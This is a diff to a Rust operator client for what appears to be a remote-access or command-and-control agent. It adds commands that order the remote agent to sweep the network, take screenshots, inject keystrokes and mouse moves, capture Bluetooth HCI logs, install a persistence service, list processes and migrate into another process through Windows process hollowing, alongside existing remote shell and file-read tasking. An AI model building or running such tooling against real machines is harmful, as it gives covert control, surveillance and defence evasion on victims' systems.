@@ -84,6 +84,44 @@ enum Commands {
     Deploy { module_name: String },
     /// Tell the agent to reload its configuration file.
     ReloadConfig,
+    /// Run an LAN/host network discovery sweep on the agent host.
+    Discover,
+    /// Capture a screenshot of the agent host's primary display.
+    Screenshot {
+        /// Local path to save the returned image (or returned payload).
+        #[clap(long, default_value = "screenshot.png")]
+        out: String,
+    },
+    /// Send a single key press, or run an interactive `key>` REPL when --repl is set.
+    Key {
+        /// One key to send. Required unless --repl is set.
+        key: Option<String>,
+        /// Read keys from stdin one per line until EOF.
+        #[clap(long)]
+        repl: bool,
+    },
+    /// Move the mouse to absolute coordinates, or open an interactive `x y` REPL.
+    Mouse {
+        x: Option<i32>,
+        y: Option<i32>,
+        /// Read coordinate pairs ("x y") from stdin until EOF.
+        #[clap(long)]
+        repl: bool,
+    },
+    /// Start the host's HCI Bluetooth research log buffer.
+    HciStart,
+    /// Stop the host's HCI log buffer.
+    HciStop,
+    /// Fetch the contents of the HCI log buffer.
+    HciLog,
+    /// Install the agent's persistence service.
+    PersistEnable,
+    /// Remove the agent's persistence service.
+    PersistDisable,
+    /// Snapshot the agent's process list as JSON.
+    ListProcs,
+    /// Migrate the agent into the address space of `pid` (Windows hollowing).
+    Migrate { pid: u32 },
 }
 
 // ─────────────────────────── TLS helpers (rustls 0.23) ───────────────────────
@@ -272,6 +310,7 @@ async fn main() -> Result<()> {
                 .send(Message::TaskRequest {
                     task_id: task_id.clone(),
                     command: Command::ReadFile { path: remote },
+                    operator_id: None,
                 })
                 .await?;
             receive_response(&mut *transport, &local, true).await?;
@@ -281,10 +320,50 @@ async fn main() -> Result<()> {
             module_id: module_name,
         },
         Commands::ReloadConfig => Command::ReloadConfig,
+        Commands::Discover => Command::DiscoverNetwork,
+        Commands::Screenshot { out } => {
+            transport
+                .send(Message::TaskRequest {
+                    task_id: task_id.clone(),
+                    command: Command::CaptureScreen,
+                    operator_id: None,
+                })
+                .await?;
+            // Treat the response payload as base64-encoded image bytes.
+            receive_response(&mut *transport, &out, true).await?;
+            return Ok(());
+        }
+        Commands::Key { key, repl } => {
+            if repl {
+                return run_key_repl(&mut *transport).await;
+            }
+            let key =
+                key.ok_or_else(|| anyhow::anyhow!("key argument required (or pass --repl)"))?;
+            Command::SimulateKey { key }
+        }
+        Commands::Mouse { x, y, repl } => {
+            if repl {
+                return run_mouse_repl(&mut *transport).await;
+            }
+            let x = x.ok_or_else(|| anyhow::anyhow!("x coordinate required (or pass --repl)"))?;
+            let y = y.ok_or_else(|| anyhow::anyhow!("y coordinate required (or pass --repl)"))?;
+            Command::SimulateMouse { x, y }
+        }
+        Commands::HciStart => Command::StartHciLogging,
+        Commands::HciStop => Command::StopHciLogging,
+        Commands::HciLog => Command::GetHciLogBuffer,
+        Commands::PersistEnable => Command::EnablePersistence,
+        Commands::PersistDisable => Command::DisablePersistence,
+        Commands::ListProcs => Command::ListProcesses,
+        Commands::Migrate { pid } => Command::MigrateAgent { target_pid: pid },
     };
 
     transport
-        .send(Message::TaskRequest { task_id, command })
+        .send(Message::TaskRequest {
+            task_id,
+            command,
+            operator_id: None,
+        })
         .await?;
 
     receive_response(&mut *transport, "", false).await
@@ -339,6 +418,7 @@ async fn handle_shell(transport: &mut dyn Transport) -> Result<()> {
         .send(Message::TaskRequest {
             task_id,
             command: Command::StartShell,
+            operator_id: None,
         })
         .await?;
 
@@ -367,6 +447,7 @@ async fn handle_shell(transport: &mut dyn Transport) -> Result<()> {
                             session_id: session_id.clone(),
                             data: buf[..n].to_vec(),
                         },
+                        operator_id: None,
                     })
                     .await?;
             }
@@ -379,6 +460,7 @@ async fn handle_shell(transport: &mut dyn Transport) -> Result<()> {
                 command: Command::ShellOutput {
                     session_id: session_id.clone(),
                 },
+                operator_id: None,
             })
             .await?;
 
@@ -402,6 +484,89 @@ async fn handle_shell(transport: &mut dyn Transport) -> Result<()> {
         }
 
         tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+    }
+    Ok(())
+}
+
+/// Read keys one per line from stdin and send each as a SimulateKey command.
+/// Quits on EOF or on the literal line "quit".
+async fn run_key_repl(transport: &mut dyn Transport) -> Result<()> {
+    use std::io::BufRead;
+    let stdin = std::io::stdin();
+    let mut handle = stdin.lock();
+    let mut line = String::new();
+    println!("key> (one key per line, EOF or `quit` to exit)");
+    loop {
+        line.clear();
+        let n = handle.read_line(&mut line)?;
+        if n == 0 {
+            break;
+        }
+        let key = line.trim().to_string();
+        if key.is_empty() {
+            continue;
+        }
+        if key == "quit" {
+            break;
+        }
+        let task_id = uuid::Uuid::new_v4().to_string();
+        transport
+            .send(Message::TaskRequest {
+                task_id,
+                command: Command::SimulateKey { key },
+                operator_id: None,
+            })
+            .await?;
+        receive_response(transport, "", false).await?;
+    }
+    Ok(())
+}
+
+/// Read "x y" pairs one per line from stdin and send each as a SimulateMouse
+/// command. Quits on EOF or on the literal line "quit".
+async fn run_mouse_repl(transport: &mut dyn Transport) -> Result<()> {
+    use std::io::BufRead;
+    let stdin = std::io::stdin();
+    let mut handle = stdin.lock();
+    let mut line = String::new();
+    println!("mouse> (one `x y` pair per line, EOF or `quit` to exit)");
+    loop {
+        line.clear();
+        let n = handle.read_line(&mut line)?;
+        if n == 0 {
+            break;
+        }
+        let trimmed = line.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if trimmed == "quit" {
+            break;
+        }
+        let mut parts = trimmed.split_whitespace();
+        let x: i32 = match parts.next().and_then(|s| s.parse().ok()) {
+            Some(v) => v,
+            None => {
+                eprintln!("expected `x y`, got `{trimmed}`");
+                continue;
+            }
+        };
+        let y: i32 = match parts.next().and_then(|s| s.parse().ok()) {
+            Some(v) => v,
+            None => {
+                eprintln!("expected `x y`, got `{trimmed}`");
+                continue;
+            }
+        };
+        let task_id = uuid::Uuid::new_v4().to_string();
+        transport
+            .send(Message::TaskRequest {
+                task_id,
+                command: Command::SimulateMouse { x, y },
+                operator_id: None,
+            })
+            .await?;
+        receive_response(transport, "", false).await?;
     }
     Ok(())
 }
